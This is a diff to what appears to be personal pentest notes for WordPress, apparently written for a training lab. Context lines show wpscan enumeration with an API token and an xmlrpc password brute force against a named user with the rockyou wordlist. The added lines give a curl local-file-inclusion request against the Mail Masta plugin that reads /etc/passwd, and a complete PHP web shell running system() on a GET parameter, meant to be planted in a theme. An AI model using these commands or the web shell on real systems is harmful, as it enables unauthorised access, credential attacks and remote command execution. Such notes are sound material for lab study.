@@ -70,3 +70,28 @@ wpscan --url http://94.237.48.51:32588 --enumerate --api-token Zgus5KAsiK755cpYU
 ```bash
 wpscan --url http://94.237.48.51:32588 --password-attack xmlrpc -t 20 -U roger -P /usr/share/wordlists/rockyou.txt 
 ```
+# Common Attacks
+## Mail Masta PLugin
+```bash
+curl http://blog.inlanefreight.com/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
+```
+## Themes Reverse Shell
+```bash
+<html>
+<body>
+<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+<input type="TEXT" name="cmd" id="cmd" size="80">
+<input type="SUBMIT" value="Execute">
+</form>
+<pre>
+<?php
+    if(isset($_GET['cmd']))
+    {
+        system($_GET['cmd']);
+    }
+?>
+</pre>
+</body>
+<script>document.getElementById("cmd").focus();</script>
+</html>
+```
